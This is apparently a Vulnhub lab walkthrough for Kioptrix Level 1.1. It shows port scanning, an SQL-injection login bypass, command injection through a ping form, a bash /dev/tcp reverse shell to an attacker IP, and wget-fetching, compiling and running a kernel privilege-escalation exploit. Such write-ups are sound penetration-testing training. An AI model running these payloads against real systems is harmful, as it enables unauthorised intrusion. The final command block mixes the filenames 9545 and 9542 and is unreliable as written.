[[Vulnhub]]

# Machine Link
https://www.vulnhub.com/entry/kioptrix-level-11-2,23/

# Enumeration

Finding the internal network ip with namp :
```bash
nmap -sn 192.168.1.1/24
```

The ip in this case is 192.168.1.133

Scanning open ports through nmap :
```bash
nmap -v -p- 192.168.1.133

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
631/tcp  open  ipp
964/tcp  open  unknown
3306/tcp open  mysql
```


Starting from port 80 we found remote admin login page :
<img width="1915" height="1049" alt="image" src="https://github.com/user-attachments/assets/acf1e6e5-bc6d-4f82-942c-53debf6a1987" />


# SQL Injection

Now as this machine has a web application and an mysql instance running, we can try loging on the page with the use of sql injection payload.

Here i have used a payload list of "SQL injection authentication bypass" from :
https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/SQL-Injection-Auth-Bypass-Payloads.txt


Here we used these payload in both username and password string in the burp intruder using Sniper attack mode and we found 45 payloads through which we can bypass the login functionality :
<img width="1547" height="585" alt="image" src="https://github.com/user-attachments/assets/3ab7e082-733d-4d79-b94b-ab52e1457008" />

<img width="1917" height="1046" alt="image" src="https://github.com/user-attachments/assets/983b861d-ab2f-4d8b-8b05-3a022c23bbd7" />


After login we found this page where we can ping any ip of internal network :
<img width="1915" height="1050" alt="image" src="https://github.com/user-attachments/assets/2b47ffe9-9393-4984-b20c-d7cd4f419a26" />


Here we found that not only ping command but we can run any command by using operators like `&&, |, ;` :
<img width="1660" height="636" alt="image" src="https://github.com/user-attachments/assets/5d0e7e75-ceed-439b-a696-5813c3b6d247" />

Now through this remote code execution by abusing the ping functionality we can get reverse shell.

# Getting Reverse Shell

Now as we have command execution we can simply use the basic reverse shell command to get the shell

Start the listner on attackers sytem :
```bash
nc -nlvp 443
```

Give the payload :
```bash
127.0.0.1 -c 1 | bash -i >& /dev/tcp/192.168.1.8/443 0>&1
```

We got the shell :
<img width="1918" height="1052" alt="image" src="https://github.com/user-attachments/assets/ce01ca84-d0df-44eb-a619-5236f893272e" />

We got the shell as ***apache*** user.

---
# Privilege Escalation 

We need to find the OS and kernel version of the target system for that :
```bash
bash-3.00$ cat /etc/*-release
CentOS release 4.5 (Final)
```

Now through google search for privilege escalation i found this exploit from exploitdb :
https://www.exploit-db.com/exploits/9542

Download this exploit directly into the target machine by using wget :
(or alternatively you can copy the exploit from `/usr/share/exploitdb/exploits/linux_x86/local/9542.c` to the machine by use of apache, python portable server, etc)

```bash
cd /tmp

wget https://www.exploit-db.com/download/9542

#compile the code
gcc -m32 -o 9545 9545.c

#give executable permission
chmod +x 9542

#run the exploit
./9542
```

---
